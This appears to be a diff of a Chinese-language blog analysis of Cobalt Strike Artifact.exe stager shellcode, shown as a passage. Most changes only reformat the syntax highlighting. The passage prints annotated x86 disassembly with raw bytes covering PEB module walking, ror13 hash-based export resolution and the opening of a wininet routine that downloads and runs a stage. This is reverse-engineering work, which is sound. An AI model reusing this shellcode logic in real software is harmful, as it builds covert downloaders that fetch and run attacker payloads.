-   +<span class="number">0x018</span> DllBase          : Ptr32 Void
-   +<span class="number">0x01c</span> EntryPoint       : Ptr32 Void
-   +<span class="number">0x020</span> SizeOfImage      : Uint4B
-   +<span class="number">0x024</span> FullDllName      : _UNICODE_STRING
-   +<span class="number">0x02c</span> BaseDllName      : _UNICODE_STRING  
-   +<span class="number">0x034</span> Flags            : Uint4B           <span class="comment">;+0x030 x86asmxist. What???</span>
-   +<span class="number">0x038</span> LoadCount        : Uint2B
-   +<span class="number">0x03a</span> TlsIndex         : Uint2B
-   +<span class="number">0x03c</span> HashLinks        : _LIST_ENTRY
-   +<span class="number">0x03c</span> SectionPointer   : Ptr32 Void
-   +<span class="number">0x040</span> CheckSum         : Uint4B
-   +<span class="number">0x044</span> TimeDateStamp    : Uint4B
-   +<span class="number">0x044</span> LoadedImports    : Ptr32 Void
-   +<span class="number">0x048</span> EntryPointActivationContext : Ptr32 _ACTIVATION_CONTEXT
-   +<span class="number">0x04c</span> PatchInformation : Ptr32 Void
-   +<span class="number">0x050</span> ForwarderLinks   : _LIST_ENTRY
-   +<span class="number">0x058</span> ServiceTagLinks  : _LIST_ENTRY
-   +<span class="number">0x060</span> StaticLinks      : _LIST_ENTRY
-   +<span class="number">0x068</span> ContextInformation : Ptr32 Void
-   +<span class="number">0x06c</span> OriginalBase     : Uint4B
-   +<span class="number">0x070</span> LoadTime         : _LARGE_INTEGER
+   +0x000 InLoadOrderLinks : _LIST_ENTRY
+   +0x008 InMemoryOrderLinks : _LIST_ENTRY
+   +0x010 InInitializationOrderLinks : _LIST_ENTRY
+   +0x018 DllBase          : Ptr32 Void
+   +0x01c EntryPoint       : Ptr32 Void
+   +0x020 SizeOfImage      : Uint4B
+   +0x024 FullDllName      : _UNICODE_STRING
+   +0x02c BaseDllName      : _UNICODE_STRING  
+   +0x034 Flags            : Uint4B           ;+0x030 x86asmxist. What???
+   +0x038 LoadCount        : Uint2B
+   +0x03a TlsIndex         : Uint2B
+   +0x03c HashLinks        : _LIST_ENTRY
+   +0x03c SectionPointer   : Ptr32 Void
+   +0x040 CheckSum         : Uint4B
+   +0x044 TimeDateStamp    : Uint4B
+   +0x044 LoadedImports    : Ptr32 Void
+   +0x048 EntryPointActivationContext : Ptr32 _ACTIVATION_CONTEXT
+   +0x04c PatchInformation : Ptr32 Void
+   +0x050 ForwarderLinks   : _LIST_ENTRY
+   +0x058 ServiceTagLinks  : _LIST_ENTRY
+   +0x060 StaticLinks      : _LIST_ENTRY
+   +0x068 ContextInformation : Ptr32 Void
+   +0x06c OriginalBase     : Uint4B
+   +0x070 LoadTime         : _LARGE_INTEGER
 </code></pre>
 <p>发现偏移<code>0x30</code>处并不存在完整的数据结构。</p>
 <p>难道我们理解错了吗？</p>
@@ -427,30 +416,29 @@ ntdll!_LDR_DATA_TABLE_ENTRY
 <p>那么我们可以合理猜测，<code>BaseDLLName</code>的类型<code>_UNICODE_STRING</code>并非是一个简单的指针，而是一个结构体，包含了长度和地址等信息。</p>
 <p>在文章<a href="https://0xevilc0de.com/locating-dll-name-from-the-process-environment-block-peb/" target="_blank" rel="noopener">Locating DLL Name from the Process Environment Block (PEB)</a>中，我们的想法得到了印证：</p>
 <hr>
-<p>So what are we missing? Notice that <em>BaseDllName</em> is of type <em>UNICODE_STRING</em> this will require a little more investigation. According to Microsoft, this isn’t simply a pointer to a Unicode string but rather a <em>UNICODE_STRING</em> structure (<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wudfwdm/ns-wudfwdm-_unicode_string" target="_blank" rel="noopener">MSDN</a>), which is defined as:</p>
-<pre class="highlight"><code class="C"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> {</span>
+<p>So what are we missing? Notice that <em>BaseDllName</em> is of type <em>UNICODE_STRING</em> this will require a little more investigation. According to Microsoft, this isn’t simply a pointer to a Unicode string but rather a <em>UNICODE_STRING</em> structure (<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wudfwdm/ns-wudfwdm-_unicode_string" target="_blank" rel="noopener">MSDN</a>), which is defined as: </p>
+<pre><code class="lang-C">typedef struct _UNICODE_STRING {
 USHORT Length;
 USHORT MaximumLength;
 PWSTR  Buffer;
 } UNICODE_STRING, *PUNICODE_STRING;
 </code></pre>
-<p>Notice how this structure begins with two short values – <em>Length</em> and <em>MaximumLength</em>. To access the pointer to the string, we need to adjust from the base of this structure 4 bytes (2 shorts/2 bytes * 2). With this is mind, it should now be clear how the code is obtaining the Unicode string for the DLL name.</p>
-<pre class="highlight"><code class="x86asm">+<span class="number">0x008</span> InMemoryOrderLinks : _LIST_ENTRY
-+<span class="number">0x010</span> InInitializationOrderLinks : _LIST_ENTRY
-+<span class="number">0x018</span> DllBase : Ptr32 Void
-+<span class="number">0x01c</span> EntryPoint : Ptr32 Void
-+<span class="number">0x020</span> SizeOfImage : Uint4B
-+<span class="number">0x024</span> FullDllName : _UNICODE_STRING
-+<span class="number">0x02c</span> BaseDllName : _UNICODE_STRING
-+<span class="number">0x02c</span> Length : USHORT
-+<span class="number">0x02e</span> MaximumLength : USHORT
-+<span class="number">0x030</span> Buffer : PWSTR
+<p>Notice how this structure begins with two short values – <em>Length</em> and <em>MaximumLength</em>. To access the pointer to the string, we need to adjust from the base of this structure 4 bytes (2 shorts/2 bytes * 2). With this is mind, it should now be clear how the code is obtaining the Unicode string for the DLL name. </p>
+<pre><code class="lang-x86asm">+0x008 InMemoryOrderLinks : _LIST_ENTRY
++0x010 InInitializationOrderLinks : _LIST_ENTRY
++0x018 DllBase : Ptr32 Void
++0x01c EntryPoint : Ptr32 Void
++0x020 SizeOfImage : Uint4B
++0x024 FullDllName : _UNICODE_STRING
++0x02c BaseDllName : _UNICODE_STRING
++0x02c Length : USHORT
++0x02e MaximumLength : USHORT
++0x030 Buffer : PWSTR
 </code></pre>
 <hr>
-<h5 id="223-通过hash找到目标函数"><a class="markdownIt-Anchor" href="#223-通过hash找到目标函数"></a> 2.2.3 通过Hash找到目标函数</h5>
-<p>于是，指令<code>mov esi, [edx+0x28]</code>以及<code>mov esi, [edx+0x26]</code>将得到<code>esi=BaseDLLName</code>、<code>ecx=BaseDLLNameLen</code>。</p>
+<h5 id="2-2-3-通过Hash找到目标函数"><a href="#2-2-3-通过Hash找到目标函数" class="headerlink" title="2.2.3 通过Hash找到目标函数"></a>2.2.3 通过Hash找到目标函数</h5><p>于是，指令<code>mov esi, [edx+0x28]</code>以及<code>mov esi, [edx+0x26]</code>将得到<code>esi=BaseDLLName</code>、<code>ecx=BaseDLLNameLen</code>。</p>
 <p>接下来就是通过自己设计的一个算法计算<code>BaseDLLName</code>的HASH，存入栈中。</p>
-<pre class="highlight"><code class="asm">0x001c:  31 FF        xor    edi, edi
+<pre><code class="lang-asm">0x001c:  31 FF        xor    edi, edi
 0x001e:  31 C0        xor    eax, eax
 0x0020:  AC           lodsb  al, byte ptr [esi]
 0x0021:  3C 61        cmp    al, 0x61  ;&quot;a&quot;
@@ -476,224 +464,217 @@ PWSTR  Buffer;
 <li>找到从MZ头到PE头再找到导入表；</li>
 <li>再由导入表获取导出函数名以及个数，遍历获取计算HASH，再与事先计算好的8字节长的HASH匹配。</li>
 </ol>
-<pre class="highlight"><code class="x86asm"><span class="number">0x0030</span>:  8B <span class="number">52</span> <span class="number">10</span>   <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edx</span> + <span class="number">0x10</span>] <span class="comment">;edx=DLLBase</span>
-<span class="number">0x0033</span>:  8B <span class="number">42</span> 3C   <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edx</span> + <span class="number">0x3c</span>] <span class="comment">;eax=PE Header RVA</span>
-<span class="number">0x0036</span>:  <span class="number">01</span> D0      <span class="keyword">add</span>    <span class="built_in">eax</span>, <span class="built_in">edx</span>                    <span class="comment">;eax=PE Header VA</span>
-<span class="number">0x0038</span>:  8B <span class="number">40</span> <span class="number">78</span>   <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x78</span>] <span class="comment">;eax=ExportTable RVA</span>
-<span class="number">0x003b</span>:  <span class="number">85</span> C0      <span class="keyword">test</span>   <span class="built_in">eax</span>, <span class="built_in">eax</span>
-<span class="number">0x003d</span>:  <span class="number">74</span> 4A      <span class="keyword">je</span>     <span class="number">0x89</span>
-<span class="number">0x003f</span>:  <span class="number">01</span> D0      <span class="keyword">add</span>    <span class="built_in">eax</span>, <span class="built_in">edx</span>                    <span class="comment">;eax=ExportTable RVA</span>
-<span class="number">0x0041</span>:  <span class="number">50</span>         <span class="keyword">push</span>   <span class="built_in">eax</span>                         <span class="comment">;save ExportTable VA</span>
-<span class="number">0x0042</span>:  8B <span class="number">48</span> <span class="number">18</span>   <span class="keyword">mov</span>    <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x18</span>] <span class="comment">;ecx=NumberOfNames  </span>
-<span class="number">0x0045</span>:  8B <span class="number">58</span> <span class="number">20</span>   <span class="keyword">mov</span>    <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x20</span>] <span class="comment">;ebx=AddressOfNamesRVA</span>
-<span class="number">0x0048</span>:  <span class="number">01</span> D3      <span class="keyword">add</span>    <span class="built_in">ebx</span>, <span class="built_in">edx</span>                    <span class="comment">;ebx=AddressOfNamesVA</span>
-<span class="number">0x004a</span>:  E3 3C      <span class="keyword">jecxz</span>  <span class="number">0x88</span>                        <span class="comment">;若遍历完毕寻找下一个模块</span>
-<span class="number">0x004c</span>:  <span class="number">49</span>         <span class="keyword">dec</span>    <span class="built_in">ecx</span>
-<span class="number">0x004d</span>:  8B <span class="number">34</span> 8B   <span class="keyword">mov</span>    <span class="built_in">esi</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span> + <span class="built_in">ecx</span>*<span class="number">4</span>]
-<span class="number">0x0050</span>:  <span class="number">01</span> D6      <span class="keyword">add</span>    <span class="built_in">esi</span>, <span class="built_in">edx</span>                     <span class="comment">;esi=ExportFunctionNameVA</span>
-<span class="number">0x0052</span>:  <span class="number">31</span> FF      <span class="keyword">xor</span>    <span class="built_in">edi</span>, <span class="built_in">edi</span>
-<span class="number">0x0054</span>:  <span class="number">31</span> C0      <span class="keyword">xor</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>
-<span class="number">0x0056</span>:  AC         <span class="keyword">lodsb</span>  <span class="built_in">al</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]          
-<span class="number">0x0057</span>:  C1 CF <span class="number">0D</span>   <span class="keyword">ror</span>    <span class="built_in">edi</span>, <span class="number">0xd</span>
-<span class="number">0x005a</span>:  <span class="number">01</span> C7      <span class="keyword">add</span>    <span class="built_in">edi</span>, <span class="built_in">eax</span>
-<span class="number">0x005c</span>:  <span class="number">38</span> E0      <span class="keyword">cmp</span>    <span class="built_in">al</span>, <span class="number">ah</span>                       <span class="comment">;判断等于\x00，即字符串结束</span>
-<span class="number">0x005e</span>:  <span class="number">75</span> F4      <span class="keyword">jne</span>    <span class="number">0x54</span>                         <span class="comment">;edi=FunctionNameHash</span>
-<span class="number">0x0060</span>:  <span class="number">03</span> <span class="number">7D</span> F8   <span class="keyword">add</span>    <span class="built_in">edi</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">8</span>]     <span class="comment">;[ebp-8]=DLL hash</span>
-                                                                    <span class="comment">;edi=DLL hash+FunctionNameHash</span>
-<span class="comment">;[ebp+0x24]=倒数十入栈的参数，即函数调用的第一个参数，即提前计算好的Hash值</span>
-<span class="number">0x0063</span>:  3B <span class="number">7D</span> <span class="number">24</span>   <span class="keyword">cmp</span>    <span class="built_in">edi</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">0x24</span>]  
-<span class="number">0x0066</span>:  <span class="number">75</span> E2      ne    <span class="number">0x4a</span>                         <span class="comment">;若不相等，计算下一个导出函数</span>
+<pre><code class="lang-x86asm">0x0030:  8B 52 10   mov    edx, dword ptr [edx + 0x10] ;edx=DLLBase
+0x0033:  8B 42 3C   mov    eax, dword ptr [edx + 0x3c] ;eax=PE Header RVA
+0x0036:  01 D0      add    eax, edx                    ;eax=PE Header VA
+0x0038:  8B 40 78   mov    eax, dword ptr [eax + 0x78] ;eax=ExportTable RVA
+0x003b:  85 C0      test   eax, eax
+0x003d:  74 4A      je     0x89
+0x003f:  01 D0      add    eax, edx                    ;eax=ExportTable RVA
+0x0041:  50         push   eax                         ;save ExportTable VA
+0x0042:  8B 48 18   mov    ecx, dword ptr [eax + 0x18] ;ecx=NumberOfNames  
+0x0045:  8B 58 20   mov    ebx, dword ptr [eax + 0x20] ;ebx=AddressOfNamesRVA
+0x0048:  01 D3      add    ebx, edx                    ;ebx=AddressOfNamesVA
+0x004a:  E3 3C      jecxz  0x88                        ;若遍历完毕寻找下一个模块
+0x004c:  49         dec    ecx
+0x004d:  8B 34 8B   mov    esi, dword ptr [ebx + ecx*4]
+0x0050:  01 D6      add    esi, edx                     ;esi=ExportFunctionNameVA
+0x0052:  31 FF      xor    edi, edi
+0x0054:  31 C0      xor    eax, eax
+0x0056:  AC         lodsb  al, byte ptr [esi]          
+0x0057:  C1 CF 0D   ror    edi, 0xd
+0x005a:  01 C7      add    edi, eax
+0x005c:  38 E0      cmp    al, ah                       ;判断等于\x00，即字符串结束
+0x005e:  75 F4      jne    0x54                         ;edi=FunctionNameHash
+0x0060:  03 7D F8   add    edi, dword ptr [ebp - 8]     ;[ebp-8]=DLL hash
+                                                                    ;edi=DLL hash+FunctionNameHash
+;[ebp+0x24]=倒数十入栈的参数，即函数调用的第一个参数，即提前计算好的Hash值
+0x0063:  3B 7D 24   cmp    edi, dword ptr [ebp + 0x24]  
+0x0066:  75 E2      ne    0x4a                         ;若不相等，计算下一个导出函数
 
-<span class="number">0x0080</span>:  5B         <span class="keyword">pop</span>    <span class="built_in">ebx</span>
-<span class="number">0x0081</span>:  5B         <span class="keyword">pop</span>    <span class="built_in">ebx</span>                          <span class="comment">;调整栈帧</span>
-<span class="number">0x0082</span>:  <span class="number">61</span>         popal                               <span class="comment">;恢复寄存器</span>
-<span class="number">0x0083</span>:  <span class="number">59</span>         <span class="keyword">pop</span>    <span class="built_in">ecx</span>                          <span class="comment">;返回地址</span>
-<span class="number">0x0084</span>:  5A         <span class="keyword">pop</span>    <span class="built_in">edx</span>                          <span class="comment">;call ebp的第一个参数，已经没用了</span>
-<span class="number">0x0085</span>:  <span class="number">51</span>         <span class="keyword">push</span>   <span class="built_in">ecx</span>                          <span class="comment">;返回地址入栈</span>
-<span class="number">0x0086</span>:  FF E0      <span class="keyword">jmp</span>    <span class="built_in">eax</span>                          <span class="comment">;jmp函数VA</span>
+0x0080:  5B         pop    ebx
+0x0081:  5B         pop    ebx                          ;调整栈帧
+0x0082:  61         popal                               ;恢复寄存器
+0x0083:  59         pop    ecx                          ;返回地址
+0x0084:  5A         pop    edx                          ;call ebp的第一个参数，已经没用了
+0x0085:  51         push   ecx                          ;返回地址入栈
+0x0086:  FF E0      jmp    eax                          ;jmp函数VA
 </code></pre>
 <p>MZ文件头结构<code>_IMAGE_DOS_HEADER</code>如下，则指令<code>mov eax, [edx + 0x3c]</code>取出的是<code>e_lfanew</code>，即PE头的偏移。</p>
-<pre class="highlight"><code class="x86asm"><span class="built_in">dt</span> _IMAGE_DOS_HEADER
+<pre><code class="lang-x86asm">dt _IMAGE_DOS_HEADER
 ntdll!_IMAGE_DOS_HEADER
-   +<span class="number">0x000</span> e_magic          : Uint2B
-   +<span class="number">0x002</span> e_cblp           : Uint2B
-   +<span class="number">0x004</span> e_cp             : Uint2B
-   +<span class="number">0x006</span> e_crlc           : Uint2B
-   +<span class="number">0x008</span> e_cparhdr        : Uint2B
-   +<span class="number">0x00a</span> e_minalloc       : Uint2B
-   +<span class="number">0x00c</span> e_maxalloc       : Uint2B
-   +<span class="number">0x00e</span> e_ss             : Uint2B
-   +<span class="number">0x010</span> e_sp             : Uint2B
-   +<span class="number">0x012</span> e_csum           : Uint2B
-   +<span class="number">0x014</span> e_ip             : Uint2B
-   +<span class="number">0x016</span> e_cs             : Uint2B
-   +<span class="number">0x018</span> e_lfarlc         : Uint2B
-   +<span class="number">0x01a</span> e_ovno           : Uint2B
-   +<span class="number">0x01c</span> e_res            : [<span class="number">4</span>] Uint2B
-   +<span class="number">0x024</span> e_oemid          : Uint2B
-   +<span class="number">0x026</span> e_oeminfo        : Uint2B
-   +<span class="number">0x028</span> e_res2           : [<span class="number">10</span>] Uint2B
-   +<span class="number">0x03c</span> e_lfanew         : Int4B       # [<span class="built_in">edx</span> + <span class="number">0x3c</span>] PE HEADER RVA
+   +0x000 e_magic          : Uint2B
+   +0x002 e_cblp           : Uint2B
+   +0x004 e_cp             : Uint2B
+   +0x006 e_crlc           : Uint2B
+   +0x008 e_cparhdr        : Uint2B
+   +0x00a e_minalloc       : Uint2B
+   +0x00c e_maxalloc       : Uint2B
+   +0x00e e_ss             : Uint2B
+   +0x010 e_sp             : Uint2B
+   +0x012 e_csum           : Uint2B
+   +0x014 e_ip             : Uint2B
+   +0x016 e_cs             : Uint2B
+   +0x018 e_lfarlc         : Uint2B
+   +0x01a e_ovno           : Uint2B
+   +0x01c e_res            : [4] Uint2B
+   +0x024 e_oemid          : Uint2B
+   +0x026 e_oeminfo        : Uint2B
+   +0x028 e_res2           : [10] Uint2B
+   +0x03c e_lfanew         : Int4B       # [edx + 0x3c] PE HEADER RVA
 </code></pre>
 <p>指令<code>mov eax, dword ptr [eax + 0x78]</code>从PE头找到导入表的位置，偏移<code>0x78=len(PE Signature)+len(Optional Header)=0x18+0x60</code>，而对应导出表的<code>IMAGE_EXPORT_DIRECTORY</code>结构体:</p>
-<pre class="highlight"><code class="x86asm"> <span class="built_in">dt</span> IMAGE_EXPORT_DIRECTORY
+<pre><code class="lang-x86asm"> dt IMAGE_EXPORT_DIRECTORY
 ole32!IMAGE_EXPORT_DIRECTORY
-   +<span class="number">0x000</span> Characteristics  : Uint4B
-   +<span class="number">0x004</span> TimeDateStamp    : Uint4B
-   +<span class="number">0x008</span> MajorVersion     : Uint2B
-   +<span class="number">0x00a</span> MinorVersion     : Uint2B
-   +<span class="number">0x00c</span> Name             : Uint4B
-   +<span class="number">0x010</span> Base             : Uint4B
-   +<span class="number">0x014</span> NumberOfFunctions : Uint4B
-   +<span class="number">0x018</span> NumberOfNames    : Uint4B          # Fetch
-   +<span class="number">0x01c</span> AddressOfFunctions : Uint4B        # Fetch
-   +<span class="number">0x020</span> AddressOfNames   : Uint4B          # Fetch
-   +<span class="number">0x024</span> AddressOfNameOrdinals : Uint4B     # Fetch
+   +0x000 Characteristics  : Uint4B
+   +0x004 TimeDateStamp    : Uint4B
+   +0x008 MajorVersion     : Uint2B
+   +0x00a MinorVersion     : Uint2B
+   +0x00c Name             : Uint4B
+   +0x010 Base             : Uint4B
+   +0x014 NumberOfFunctions : Uint4B
+   +0x018 NumberOfNames    : Uint4B          # Fetch
+   +0x01c AddressOfFunctions : Uint4B        # Fetch
+   +0x020 AddressOfNames   : Uint4B          # Fetch
+   +0x024 AddressOfNameOrdinals : Uint4B     # Fetch
 </code></pre>
 <p>下面四条指令读取了导出表结构中的导出函数个数以及函数名、序号、地址等列表的地址，其实就是取到了遍历所需的数据。</p>
-<pre class="highlight"><code class="x86asm"><span class="number">0x0042</span>:  8B <span class="number">48</span> <span class="number">18</span>                <span class="keyword">mov</span>    <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x18</span>] <span class="comment">;ecx=NumberOfNames  </span>
-<span class="number">0x0045</span>:  8B <span class="number">58</span> <span class="number">20</span>                <span class="keyword">mov</span>    <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x20</span>] <span class="comment">;ebx=AddressOfNamesRVA</span>
+<pre><code class="lang-x86asm">0x0042:  8B 48 18                mov    ecx, dword ptr [eax + 0x18] ;ecx=NumberOfNames  
+0x0045:  8B 58 20                mov    ebx, dword ptr [eax + 0x20] ;ebx=AddressOfNamesRVA
 ...
-<span class="number">0x0069</span>:  8B <span class="number">58</span> <span class="number">24</span>                <span class="keyword">mov</span>    <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x24</span>]  <span class="comment">;ebx=AddressOfNameOrdinalsRVA</span>
+0x0069:  8B 58 24                mov    ebx, dword ptr [eax + 0x24]  ;ebx=AddressOfNameOrdinalsRVA
 ...
-<span class="number">0x0072</span>:  8B <span class="number">58</span> 1C                <span class="keyword">mov</span>    <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x1c</span>]  <span class="comment">;ebx=AddressOfFunctionsRVA</span>
+0x0072:  8B 58 1C                mov    ebx, dword ptr [eax + 0x1c]  ;ebx=AddressOfFunctionsRVA
 </code></pre>
 <p>若导出表不存在（即地址为0）或者遍历完整个导出表都无法找到函数则根据<code>InMemoryOrderModuleList</code>双链表的Flink找到下一个<code>_LDR_DATA_TABLE_ENTRY</code>结构体继续寻找。所以每次调用都会从第一个双链表的节点依次寻找，直到找到<code>kernel32.dll</code>里面的导出函数。</p>
-<pre class="highlight"><code class="x86asm"><span class="number">0x0088</span>:  <span class="number">58</span>                      <span class="keyword">pop</span>    <span class="built_in">eax</span>
-<span class="number">0x0089</span>:  5F                      <span class="keyword">pop</span>    <span class="built_in">edi</span>
-<span class="number">0x008a</span>:  5A                      <span class="keyword">pop</span>    <span class="built_in">edx</span>                  <span class="comment">;edx=InMemoryOrderModuleList</span>
-<span class="number">0x008b</span>:  8B <span class="number">12</span>                   <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edx</span>] <span class="comment">;InMemoryOrderModuleList-&gt;Flink</span>
-<span class="number">0x008d</span>:  EB <span class="number">86</span>                   <span class="keyword">jmp</span>    <span class="number">0x15</span>                 <span class="comment">;next _LDR_DATA_TABLE_ENTRY </span>
+<pre><code class="lang-x86asm">0x0088:  58                      pop    eax
+0x0089:  5F                      pop    edi
+0x008a:  5A                      pop    edx                  ;edx=InMemoryOrderModuleList
+0x008b:  8B 12                   mov    edx, dword ptr [edx] ;InMemoryOrderModuleList-&gt;Flink
+0x008d:  EB 86                   jmp    0x15                 ;next _LDR_DATA_TABLE_ENTRY
 </code></pre>
 <p>由导出函数名和模块名产生的HASH匹配之后会计算出函数的地址，恢复寄存器，调整栈帧，入栈返回地址然后调用对应的导出函数。由于栈帧调整，此时栈内的参数正如<code>call ebp</code>之前设计的那样，按顺序逐个排列在栈内。</p>
-<pre class="highlight"><code class="x86asm"><span class="number">0x0068</span>:  <span class="number">58</span>                      <span class="keyword">pop</span>    <span class="built_in">eax</span>                          <span class="comment">;eax=ExportTable RVA</span>
-<span class="number">0x0069</span>:  8B <span class="number">58</span> <span class="number">24</span>                <span class="keyword">mov</span>    <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x24</span>]  <span class="comment">;ebx=AddressOfNameOrdinalsRVA</span>
-<span class="number">0x006c</span>:  <span class="number">01</span> D3                   <span class="keyword">add</span>    <span class="built_in">ebx</span>, <span class="built_in">edx</span>                     <span class="comment">;ebx=AddressOfNameOrdinalsVA</span>
-<span class="number">0x006e</span>:  <span class="number">66</span> 8B 0C 4B             <span class="keyword">mov</span>    <span class="built_in">cx</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span> + <span class="built_in">ecx</span>*<span class="number">2</span>]   <span class="comment">;cx=OrdinalOfFunctionIndex</span>
-<span class="number">0x0072</span>:  8B <span class="number">58</span> 1C                <span class="keyword">mov</span>    <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">0x1c</span>]  <span class="comment">;ebx=AddressOfFunctionsRVA</span>
-<span class="number">0x0075</span>:  <span class="number">01</span> D3                   <span class="keyword">add</span>    <span class="built_in">ebx</span>, <span class="built_in">edx</span>                     <span class="comment">;ebx=AddressOfFunctionsVA</span>
-<span class="number">0x0077</span>:  8B <span class="number">04</span> 8B                <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span> + <span class="built_in">ecx</span>*<span class="number">4</span>] <span class="comment">;eax=FunctionRVA</span>
-<span class="number">0x007a</span>:  <span class="number">01</span> D0                   <span class="keyword">add</span>    <span class="built_in">eax</span>, <span class="built_in">edx</span>                     <span class="comment">;eax=FunctionVA</span>
-<span class="number">0x007c</span>:  <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">24</span>             <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span> + <span class="number">0x24</span>], <span class="built_in">eax</span>  <span class="comment">;函数VA覆盖栈中第十个参数</span>
-<span class="number">0x0080</span>:  5B                      <span class="keyword">pop</span>    <span class="built_in">ebx</span>
-<span class="number">0x0081</span>:  5B                      <span class="keyword">pop</span>    <span class="built_in">ebx</span>                          <span class="comment">;调整栈帧</span>
-<span class="number">0x0082</span>:  <span class="number">61</span>                      popal                               <span class="comment">;恢复寄存器</span>
-<span class="number">0x0083</span>:  <span class="number">59</span>                      <span class="keyword">pop</span>    <span class="built_in">ecx</span>                          <span class="comment">;返回地址</span>
-<span class="number">0x0084</span>:  5A                      <span class="keyword">pop</span>    <span class="built_in">edx</span>                          <span class="comment">;call ebp的第一个参数，已经没用了</span>
-<span class="number">0x0085</span>:  <span class="number">51</span>                      <span class="keyword">push</span>   <span class="built_in">ecx</span>                          <span class="comment">;返回地址入栈</span>
-<span class="number">0x0086</span>:  FF E0                   <span class="keyword">jmp</span>    <span class="built_in">eax</span>                          <span class="comment">;jmp函数VA</span>
+<pre><code class="lang-x86asm">0x0068:  58                      pop    eax                          ;eax=ExportTable RVA
+0x0069:  8B 58 24                mov    ebx, dword ptr [eax + 0x24]  ;ebx=AddressOfNameOrdinalsRVA
+0x006c:  01 D3                   add    ebx, edx                     ;ebx=AddressOfNameOrdinalsVA
+0x006e:  66 8B 0C 4B             mov    cx, word ptr [ebx + ecx*2]   ;cx=OrdinalOfFunctionIndex
+0x0072:  8B 58 1C                mov    ebx, dword ptr [eax + 0x1c]  ;ebx=AddressOfFunctionsRVA
+0x0075:  01 D3                   add    ebx, edx                     ;ebx=AddressOfFunctionsVA
+0x0077:  8B 04 8B                mov    eax, dword ptr [ebx + ecx*4] ;eax=FunctionRVA
+0x007a:  01 D0                   add    eax, edx                     ;eax=FunctionVA
+0x007c:  89 44 24 24             mov    dword ptr [esp + 0x24], eax  ;函数VA覆盖栈中第十个参数
+0x0080:  5B                      pop    ebx
+0x0081:  5B                      pop    ebx                          ;调整栈帧
+0x0082:  61                      popal                               ;恢复寄存器
+0x0083:  59                      pop    ecx                          ;返回地址
+0x0084:  5A                      pop    edx                          ;call ebp的第一个参数，已经没用了
+0x0085:  51                      push   ecx                          ;返回地址入栈
+0x0086:  FF E0                   jmp    eax                          ;jmp函数VA
 </code></pre>
-<h4 id="23-主要调用函数"><a class="markdownIt-Anchor" href="#23-主要调用函数"></a> 2.3 主要调用函数</h4>
-<p>既然完成了函数寻址，那么后面的Shellcode就是负责下载Stage了。由于CS生成<code>Artifact.exe</code>时选择的是HTTP Listener，故主要动作还是加载&quot;winnet&quot;库，建立网络连接，利用InternetReadFile将Stage加载到VirtualAlloc申请的空间中，然后另起线程执行Stage。</p>
-<pre class="highlight"><code class="x86asm"><span class="comment">; ==================== 核心函数 ====================</span>
-<span class="number">0x008f</span>:  <span class="number">5D</span>                      <span class="keyword">pop</span>    <span class="built_in">ebp</span>
-<span class="number">0x0090</span>:  <span class="number">68</span> 6E <span class="number">65</span> <span class="number">74</span> <span class="number">00</span>          <span class="keyword">push</span>   <span class="number">0x74656e</span>
-<span class="number">0x0095</span>:  <span class="number">68</span> <span class="number">77</span> <span class="number">69</span> 6E <span class="number">69</span>          <span class="keyword">push</span>   <span class="number">0x696e6977</span>
-<span class="number">0x009a</span>:  <span class="number">54</span>                      <span class="keyword">push</span>   <span class="built_in">esp</span>                  
-<span class="number">0x009b</span>:  <span class="number">68</span> 4C <span class="number">77</span> <span class="number">26</span> <span class="number">07</span>          <span class="keyword">push</span>   <span class="number">0x726774c</span>
-<span class="comment">; LoadLibraryA("wininet")</span>
-<span class="number">0x00a0</span>:  FF D5                   <span class="keyword">call</span>   <span class="built_in">ebp</span>                
+<h4 id="2-3-主要调用函数"><a href="#2-3-主要调用函数" class="headerlink" title="2.3 主要调用函数"></a>2.3 主要调用函数</h4><p>既然完成了函数寻址，那么后面的Shellcode就是负责下载Stage了。由于CS生成<code>Artifact.exe</code>时选择的是HTTP Listener，故主要动作还是加载”winnet”库，建立网络连接，利用InternetReadFile将Stage加载到VirtualAlloc申请的空间中，然后另起线程执行Stage。</p>
+<pre><code class="lang-x86asm">; ==================== 核心函数 ====================
+0x008f:  5D                      pop    ebp
